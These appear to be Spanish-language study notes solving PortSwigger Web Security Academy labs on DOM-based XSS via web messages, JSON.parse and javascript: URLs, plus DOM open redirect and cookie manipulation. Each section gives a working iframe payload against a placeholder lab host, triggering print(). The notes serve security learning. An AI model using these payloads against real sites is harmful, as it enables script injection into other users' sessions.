Es una representación estructurada de un documento HTML o XML que permite a los desarrolladores manipular su contenido y estructura de manera programática mediante lenguajes de scripting como JavaScript.
# DOM XSS using web messages

![[01.DOM-UsingWebMessages.png]]

```js
<iframe src="https://TuLaboratorio.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

![[02.DOM-UsingWebMessages.png]]
![[03.DOM-UsingWebMessages.png]]

# DOM XSS utilizando mensajes web y una URL de JavaScript

![[01.DOM-UsingMessagesAndURL(Js).png]]

```
<iframe src="https://Tulaboratorio.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

![[02.DOM-UsingMessagesAndURL(Js).png]]
![[03.DOM-UsingMessagesAndURL(Js).png]]

# DOM XSS usando mensajes web y`JSON.parse`

Crea un `iframe` y lo manipula en respuesta a mensajes recibidos a través del evento `message`. Dependiendo del tipo de mensaje recibido, realiza diferentes acciones como hacer scroll, cambiar la URL del `iframe` o ajustar sus dimensiones.

![[01.DOM-XSS_JASON.parse.png]]

```
<iframe src=https://Tulaboratorio.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

![[02.DOM-XSS_JASON.parse.png]]
![[03.DOM-XSS_JASON.parse.png]]

# Redirección abierta basada en DOM

El `url`parámetro contiene una vulnerabilidad de redirección abierta que le permite cambiar el lugar al que lleva al usuario el enlace "Volver al blog".

![[01.RedireccionBasadaconDOM.png]]
![[02.RedireccionBasadaconDOM.png]]

# Manipulación de cookies basada en DOM

![[01.ManipulaciondeCookies.png]]

```js
<iframe src="https://Tulaboratorio.web-security-academy.net/product?productId=2&'><script>print()</script>" onload="if(!window.x)this.src='https://Tulaboratorio.web-security-academy.net/';window.x=1;">
```

![[02.ManipulaciondeCookies.png]]
